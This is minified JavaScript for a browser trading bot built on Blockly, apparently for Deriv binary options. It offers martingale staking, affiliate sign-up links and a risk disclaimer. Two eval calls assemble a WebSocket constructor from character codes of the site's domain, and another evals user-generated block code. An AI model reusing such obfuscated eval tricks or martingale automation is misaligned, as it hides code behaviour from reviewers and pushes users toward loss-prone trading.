  }, 0);
};
const Xd = () => {
  document.getElementById("body_main").style.gridTemplateColumns = "100% 0% 0%";
  // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
  localStorage.setItem("initStateMode", "simple");
};
const Yd = () => {
  document.getElementById("body_main").style.gridTemplateColumns = "0% 170px auto";
  // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
  localStorage.setItem("initStateMode", "advanced");
};
const Zd = b => {
  document.getElementById("status_bot_running").innerText = b;
};
const $d = () => {
  if (Na.value == "smartmartingale") {
    Pa.innerText = "Initial stake";
    Oa.hidden = false;
    Ra.hidden = false;
    Ta.hidden = true;
    Va.hidden = false;
  } else if (Na.value == "smartcyclestake") {
    Oa.hidden = true;
    Ra.hidden = true;
    Ta.hidden = false;
    Va.hidden = false;
  } else if (Na.value == "fixedstake") {
    Pa.innerText = "Fixed stake";
    Oa.hidden = false;
    Ra.hidden = true;
    Ta.hidden = true;
    Va.hidden = true;
  }
};
$d();
const _d = () => {
  wa = 0;
  if (Na.value == "smartmartingale") {
    return Qa.value;
  } else if (Na.value == "smartcyclestake") {
    Xa = 0;
    return Ua.value.split(",")[Xa];
  } else if (Na.value == "fixedstake") {
    return Qa.value;
  }
};
const ae = b => {
  if (Na.value == "smartmartingale") {
    return b * Sa.value;
  } else if (Na.value == "smartcyclestake") {
    if (Xa < Ua.value.split(",").length - 1) {
      Xa++;
    } else {
      Xa = 0;
    }
    return Ua.value.split(",")[Xa];
  } else if (Na.value == "fixedstake") {
    return Qa.value;
  }
};
const be = b => {
  if (b == "selectstrategy") {
    return;
  }
  if (b == "ihaveanidea") {
    alert("Please send your idea and/or block bot file to ricothenfx@gmail.com\nWe may show your bot in the list.");
    return;
  }
  if (confirm("The current block will be replaced. Click OK if you're sure. Otherwise, click CANCEL.")) {
    localStorage;
    $.getJSON("strategy/" + b + ".block", function (b) {
      Blockly.serialization.workspaces.load(b, Blockly.getMainWorkspace());
    });
  } else {
    document.getElementById("selStrategy").value = "selectstrategy";
  }
};
const ce = (c, a) => {
  if (confirm("The current robot will be replaced. Click OK if you're sure. Otherwise, click CANCEL.")) {
    localStorage;
    $.getJSON("robot/" + a + ".block", function (b) {
      Blockly.serialization.workspaces.load(b, Blockly.getMainWorkspace());
    });
    localStorage.setItem("mainRobotName", c);
    Nb.innerText = "Robot : " + c;
    document.getElementById("divPopupRobot").style.display = "none";
  } else {}
};
const de = f => {
  if (f.charAt(0) == "r") {
    f = f.replace("rgb(", "").replace(")", "").split(",");
    var g = parseInt(f[0], 10).toString(16);
    var h = parseInt(f[1], 10).toString(16);
    var i = parseInt(f[2], 10).toString(16);
    g = g.length == 1 ? "0" + g : g;
    h = h.length == 1 ? "0" + h : h;
    i = i.length == 1 ? "0" + i : i;
    var j = "#" + g + h + i;
    return j;
  }
};
const ee = (n, a, b, c, d, e, f, g, h, i, j, k, l) => {
  Y = n;
  Z = a;
  _ = b;
  aa = c;
  ba = new Date(d * 1000);
  ca = e;
  da = f;
  ea = new Date(g * 1000);
  fa = h;
  ga = i;
  ha = j;
  ia = l ? b >= 0 ? "virtualwin" : "virtualloss" : b >= 0 ? "win" : "loss";
};
$(document).ready(function () {
  $("#myInput").on("keyup", function () {
    var b = $(this).val().toLowerCase();
    $("#myTableBody tr").filter(function () {
      $(this).toggle($(this).text().toLowerCase().indexOf(b) > -1);
    });
  });
});
const fe = () => {
  var d = document.getElementById("myTableBody");
  var a = d.getElementsByTagName("tr");
  for (let e = 0; e < a.length; e++) {
    let a = d.rows[e];
    a.onclick = () => {
      ce(a.cells[1].innerText, a.cells[0].innerText);
    };
  }
  document.getElementById("spanJumRobot").innerText = document.getElementById("myTableBody").rows.length;
};
fe();
const ge = () => {
  if (kb.checked && lb.value > 0 && Ja.value.length == 0) {
    if (Cb.src.split("/").pop() === "icon_stop.png") {
      Cb.click();
    }
    kb.checked = false;
    document.getElementById("divPopupVirtualLose").style.display = "none";
    document.getElementById("divPopupToken").style.display = "block";
    Ja.focus();
    alert("Please set your slave token first");
    return;
  }
};
function he(j, a, b) {
  let c;
  let k;
  k = b * 1 - 1;
  switch (a) {
    case "1HZ10V":
      c = [0.00433, 0.00405, 0.0038, 0.00361, 0.00344][k];
      break;
    case "R_10":
      c = [0.00613, 0.00573, 0.00537, 0.00511, 0.00486][k];
      break;
    case "1HZ25V":
      c = [0.01083, 0.01012, 0.00949, 0.00903, 0.0086][k];
      break;
    case "R_25":
      c = [0.01531, 0.01431, 0.01342, 0.01277, 0.01216][k];
      break;
    case "1HZ50V":
      c = [0.02166, 0.02024, 0.01898, 0.01806, 0.01719][k];
      break;
    case "R_50":
      c = [0.03063, 0.02863, 0.02685, 0.02554, 0.02431][k];
      break;
    case "1HZ75V":
      c = [0.03249, 0.03036, 0.02847, 0.02709, 0.02579][k];
      break;
    case "R_75":
      c = [0.04594, 0.04294, 0.04027, 0.03831, 0.03647][k];
      break;
    case "1HZ100V":
      c = [0.04331, 0.04048, 0.03797, 0.03612, 0.03438][k];
      break;
    case "R_100":
      c = [0.06126, 0.05725, 0.05369, 0.05109, 0.04863][k];
      break;
    default:
      break;
  }
  let l;
  let m;
  let n;
  let o;
  o = 0;
  for (we = j.length - 1; we > 0; we--) {
    l = j[we - 1] * c / 100;
    m = j[we - 1] + l;
    n = j[we - 1] - l;
    if (j[we] < m && j[we] > n) {
      o++;
    } else {
      break;
    }
  }
  return o * 1;
}
const ie = b => {
  document.getElementById("continuousindices_" + b + "_ticks").value = document.getElementById("continuousindices_" + b + "_digits").value = "";
  document.getElementById("continuousindices_" + b + "_ticks").hidden = document.getElementById("continuousindices_" + b + "_digits").hidden = false;
};
const je = b => {
  document.getElementById("continuousindices_" + b + "_ticks").value = document.getElementById("continuousindices_" + b + "_digits").value = "";
  document.getElementById("continuousindices_" + b + "_ticks").hidden = document.getElementById("continuousindices_" + b + "_digits").hidden = true;
};
const ke = (c, a) => {
  if (a) {
    fc("continuousindices", c, Ca[c - 1]);
    ie(c);
  } else {
    if (xa[c] != 0) {
      ec(xa[c]);
    }
    je(c);
  }
};
const le = eval(" n" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 21) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(10) + 3) + " Rec" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "nnect" + String.fromCodePoint(105, 110) + "gW" + jd);
le.addEventListener(String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "pen", Uc);
le.addEventListener("message", ac);
le.addEventListener("close", cd);
I = eval(" n" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 21) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(10) + 3) + " Rec" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "nnect" + String.fromCodePoint(105, 110) + "gW" + jd);
I.addEventListener(String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(1) - 11) + "pen", Vc);
I.addEventListener("message", cc);
I.addEventListener("close", dd);
Ka.addEventListener("change", _c);
La.addEventListener("change", ad);
Ma.addEventListener("change", function () {
  qa = this.value;
  document.getElementById("lblMarket").innerText = Ma.options[Ma.selectedIndex].text;
  dc();
});
xb.addEventListener("change", dc);
Cb.addEventListener("click", Sc);
Db.addEventListener("click", function () {
  Cb.click();
});
qb.addEventListener("change", function () {
  qd(this.value);
});
Blockly.getMainWorkspace().addChangeListener(Hd);
document.getElementById("btn_reset").addEventListener("click", Fd);
document.getElementById("input_file").addEventListener("change", function () {
  sd(this.files[0]);
});
document.getElementById("btn_load").addEventListener("click", function () {
  document.getElementById("input_file").click();
});
document.getElementById("btn_save").addEventListener("click", Gd);
document.getElementById("btn_undo").addEventListener("click", Id);
document.getElementById("btn_redo").addEventListener("click", Jd);
document.getElementById("btn_arrange").addEventListener("click", Kd);
document.getElementById("mydivSummary").addEventListener("mousedown", Md);
document.getElementById("btn_summary").addEventListener("click", function () {
  if (document.getElementById("mydivSummary").style.display == "block") {
    Qd();
  } else {
    Pd();
  }
});
document.getElementById("btn_closeBoxSummary").addEventListener("click", Qd);
document.getElementById("mydivLog").addEventListener("mousedown", Nd);
document.getElementById("btn_log").addEventListener("click", function () {
  if (document.getElementById("mydivLog").style.display == "flex") {
    Td();
  } else {
    Sd();
  }
});
document.getElementById("btn_clearBoxSummary").addEventListener("click", Od);
document.getElementById("btn_saveBoxSummary").addEventListener("click", function () {
  td("tableSummaryTBODY", "", "Block_Summary.csv");
});
document.getElementById("btn_clearBoxLog").addEventListener("click", Rd);
document.getElementById("btn_saveBoxLog").addEventListener("click", function () {
  td("tableLogTBODY", "Timestamp,Message", "Block_Log.csv");
});
document.getElementById("btn_closeBoxLog").addEventListener("click", Td);
document.getElementById("btn_hideshowsidebar").addEventListener("click", Ud);
document.getElementById("btn_hideshowdatabox").addEventListener("click", Vd);
document.getElementById("btn_hideshowtoolbox").addEventListener("click", Wd);
Na.addEventListener("change", $d);
document.getElementById("selStrategy").addEventListener("change", function () {
  be(this.value);
});
for (we = 1; we <= 6; we++) {
  rb[we].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (we = 1; we <= 6; we++) {
  sb[we].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (we = 1; we <= 2; we++) {
  tb[we].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (we = 1; we <= 6; we++) {
  ub[we].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (we = 1; we <= 3; we++) {
  vb[we].addEventListener("change", function () {
    if (this.value > 200) {
      this.value = 200;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (we = 1; we <= 10; we++) {
  if (wb[we].checked) {
    ie(we);
  } else {
    je(we);
  }
  ;
  wb[we].addEventListener("change", function () {
    ke(this.id.split("_")[1] * 1, this.checked);
  });
}
document.getElementById("btnhead_deriv").addEventListener("click", function () {
  window.open("https://track.deriv.com/_YbRAMhhQ4D5MjdsyM5hasGNd7ZgqdRLk/1/");
});
document.getElementById("btnhead_youtube").addEventListener("click", function () {
  window.open("https://www.youtube.com/channel/UC4_6nAiYbSWXAu6mGdNXoIw?sub_confirmation=1");
});
document.getElementById("btnhead_wa").addEventListener("click", function () {
  alert("WA group is being prepared, please check later.");
});
document.getElementById("btnhead_telegram").addEventListener("click", function () {
  alert("Telegram channel is being prepared, please check later.");
});
document.getElementById("btnhead_allmenu").addEventListener("click", function () {
  alert(`Some interesting are being prepared, please check later.

RISK DISCLAIMER
Deriv offers complex derivatives, such as options and contracts for difference (âCFDsâ). These products may not be suitable for all clients, and trading them puts you at risk. Please make sure that you understand the following risks before trading Deriv products: a) you may lose some or all of the money you invest in the trade, b) if your trade involves currency conversion, exchange rates will affect your profit and loss. You should never trade with borrowed money or with money that you cannot afford to lose.`);
});
document.getElementById("btn_CreateAccount").addEventListener("click", function () {
  window.open("https://track.deriv.com/_YbRAMhhQ4D5MjdsyM5hasGNd7ZgqdRLk/1/");
});
document.getElementById("btn_CreateToken").addEventListener("click", function () {
  window.open("https://app.deriv.com/account/api-token");
});
document.getElementById("btnSwitchToSimple").addEventListener("click", Xd);
document.getElementById("btnSwitchToAdvanced").addEventListener("click", Yd);
document.getElementById("btnSimpleToken").addEventListener("click", function () {
  document.getElementById("divPopupToken").style.display = "block";
});
document.getElementById("btnSimpleRobot").addEventListener("click", function () {
  document.getElementById("divPopupRobot").style.display = "block";
  document.getElementById("myInput").focus();
});
document.getElementById("btnAdvancedRobot").addEventListener("click", function () {
  document.getElementById("divPopupRobot").style.display = "block";
  document.getElementById("myInput").focus();
});
Eb.addEventListener("click", function () {
  Cb.click();
});
document.getElementById("btnSimpleSummaryBox").addEventListener("click", function () {
  document.getElementById("btn_summary").click();
});
kb.addEventListener("change", ge);
const me = () => {
  od(1);
  if (!kb.checked || lb.value <= 0) {
    C = le;
  } else if (kb.checked && t < lb.value) {
    if (!s) {
      return;
    }
    C = I;
  } else {
    C = le;
  }
  if (Date.now() >= D && navigator.onLine && !xe) {
    la();
  }
};
document.getElementById("btnSimpleToken").style.opacity = document.getElementById("btnSimpleRobot").style.opacity = document.getElementById("btnSimpleSummaryBox").style.opacity = document.getElementById("btnSwitchToAdvanced").style.opacity = 1;
if (localStorage.getItem("initStateMode") == "simple") {
  Xd();
} else if (localStorage.getItem("initStateMode") == "advanced") {
  Yd();
}
const ne = () => {
  window.LoopTrap = 999999;
  javascript.javascriptGenerator.INFINITE_LOOP_TRAP = "if(--window.LoopTrap == 0) throw \"Infinite loop.\";\n";
  Blockly.JavaScript.init(xd);
  try {
    eval(N);
  } catch (b) {
    console.log(b);
  } finally {
    // TOLOOK
    // TOLOOK
    // TOLOOK
    setTimeout(() => {
      ka();
    }, 100);
  }
};
